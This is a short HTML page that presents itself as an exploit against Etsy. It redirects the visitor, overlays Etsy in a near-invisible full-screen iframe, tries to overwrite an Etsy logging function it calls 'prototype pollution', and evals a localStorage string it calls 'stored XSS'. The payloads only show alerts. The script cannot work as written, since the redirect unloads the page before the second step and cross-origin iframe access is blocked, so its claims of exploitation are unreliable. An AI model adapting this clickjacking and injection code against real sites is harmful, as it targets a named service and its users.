<!DOCTYPE html>
<html>
<head>
    <title>Redirecting...</title>
    <script>
        // Step 1: Redirect to Etsy after a short delay
        setTimeout(() => {
            window.location.href = "https://www.etsy.com";
        }, 1000);

        // Step 2: After landing on Etsy, load exploit
        setTimeout(() => {
            let iframe = document.createElement("iframe");
            iframe.src = "https://www.etsy.com";
            iframe.sandbox = "allow-scripts allow-same-origin";
            iframe.style.position = "absolute";
            iframe.style.top = "0";
            iframe.style.left = "0";
            iframe.style.width = "100%";
            iframe.style.height = "100%";
            iframe.style.opacity = "0.01"; // Invisible iframe
            iframe.style.zIndex = "9999";
            document.body.appendChild(iframe);

            iframe.onload = function() {
                let iwin = iframe.contentWindow;
                try {
                    // **Prototype Pollution Exploit**
                    iwin.__etsy_logging.eventpipe.logEventImmediately = function(payload) {
                        alert("Prototype Pollution Exploited! Payload: " + payload);
                    };
                    iwin.__etsy_logging.eventpipe.logEventImmediately("Injected XSS via Prototype Pollution!");

                    // **Stored XSS via LocalStorage**
                    iwin.localStorage.setItem("xss_payload", "alert('Stored XSS Triggered!');");
                    const payload = iwin.localStorage.getItem("xss_payload");
                    if (payload) {
                        iwin.eval(payload); // Execute stored XSS
                    }
                } catch (e) {
                    console.log("Exploit failed:", e);
                }
            };
        }, 5000); // Delay execution to ensure the victim has landed
    </script>
</head>
<body>
    <p>If you are not redirected, <a href="https://www.etsy.com">click here</a>.</p>
</body>
</html>
